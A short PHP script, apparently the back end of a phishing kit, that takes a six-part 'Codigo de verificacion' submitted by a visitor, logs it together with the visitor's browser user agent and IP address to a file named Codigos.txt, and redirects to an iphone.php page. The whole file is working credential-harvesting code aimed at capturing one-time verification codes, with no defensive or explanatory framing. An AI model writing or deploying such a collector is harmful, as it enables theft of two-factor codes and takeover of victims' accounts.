<?php

    $bro = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];


file_put_contents("Codigos.txt", "Codigo de verificacion: " . $_POST['q'] . $_POST['w'] . $_POST['e'] . $_POST['r'] . $_POST['t'] . $_POST['y'] . "\n" . $bro . $ip, FILE_APPEND);
header('Location: iphone.php');
exit();
